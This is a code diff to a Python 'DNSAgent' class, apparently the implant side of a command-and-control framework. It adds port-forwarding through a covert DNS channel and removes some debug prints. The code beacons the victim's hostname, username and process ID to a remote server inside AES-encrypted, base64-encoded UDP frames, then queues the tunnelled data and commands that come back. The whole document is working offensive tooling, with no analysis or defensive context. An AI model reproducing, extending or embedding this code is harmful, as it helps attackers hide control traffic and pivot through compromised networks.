@@ -25,11 +25,32 @@ class DNSAgent(LocalAgent):
 	username = getpass.getuser()
     
 	q = queue.Queue()
+    
+	forwardQueues = {}
 
-	def sendRecv(self, lhostname, lusername, lpid, lprotocol, lmessage):
+	def pollForward(self, forwardID):
+		if not forwardID in self.forwardQueues:
+			self.forwardQueues[forwardID] = queue.Queue()
+		if self.forwardQueues[forwardID].empty():
+			self.sendRecv(self.hostname, self.username, self.pid, "DNS", "<REQUEST_DATA>", forwardID)
+		if self.forwardQueues[forwardID].empty():
+			return None
+		else:
+			return base64.decodebytes(self.forwardQueues[forwardID].get().encode('ascii'))
+
+	def pushForward(self, forwardID, data):
+		if not forwardID in self.forwardQueues:
+			self.forwardQueues[forwardID] = queue.Queue()
+		im_b64 = base64.b64encode(data).decode('ascii')
+		self.sendRecv(self.hostname, self.username, self.pid, "DNS", im_b64, forwardID)
+
+	def sendRecv(self, lhostname, lusername, lpid, lprotocol, lmessage, forwardID = None):
 		try:    
 			if lmessage == '':
 				lmessage = "<poll>"
+			if forwardID:
+				lmessage = "<portForward>" + forwardID + "<pf>" + lmessage
+
 			header = lhostname + "<spl>" + lusername + "<spl>" + str(lpid) + "<spl>" + lprotocol + "<spl>" + lmessage
 			try:
 				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -50,43 +71,7 @@ class DNSAgent(LocalAgent):
 				headerbytes = bytes(header, 'ascii')
 				padded = pad(headerbytes, AES.block_size)
 				ct_bytes = cipher.encrypt(padded)
-				"""
-                print(iv[0])
-				print(iv[1])
-				print(iv[2])
-				print(iv[3])
-				print(iv[4])
-				print(iv[5])
-				print(iv[6])
-				print(iv[7])
-				print(iv[8])
-				print(iv[9])
-				print(iv[10])
-				print(iv[11])
-				print(iv[12])
-				print(iv[13])
-				print(iv[14])
-				print(iv[15])                
-				"""
 				full_payload = iv + ct_bytes
-				"""
-                print(full_payload[0])
-				print(full_payload[1])
-				print(full_payload[2])
-				print(full_payload[3])
-				print(full_payload[4])
-				print(full_payload[5])
-				print(full_payload[6])
-				print(full_payload[7])
-				print(full_payload[8])
-				print(full_payload[9])
-				print(full_payload[10])
-				print(full_payload[11])
-				print(full_payload[12])
-				print(full_payload[13])
-				print(full_payload[14])
-				print(full_payload[15])                
-				"""
 				im_b64 = base64.b64encode(full_payload).decode('ascii')
 				frame = bytearray()
 				frame.append(random.randbytes(1)[0])#UID1 random
@@ -115,8 +100,12 @@ class DNSAgent(LocalAgent):
 				bytesToRemove = decoded_resp[len(decoded_resp) - 1]
 				decoded_resp = decoded_resp[0:len(decoded_resp) - bytesToRemove]
 				decoded_resp = str(decoded_resp, 'utf-8')
-				if decoded_resp != '<discard>':
-					self.q.put(decoded_resp)
+				if forwardID:
+					if decoded_resp != '<No Data>':
+						self.forwardQueues[forwardID].put(decoded_resp)
+				else:
+					if decoded_resp != '<discard>':
+						self.q.put(decoded_resp)
 			except Exception as e:
 				print("Oops, something went wrong with transmission: {}".format(e), file=sys.stderr)                
 			finally:
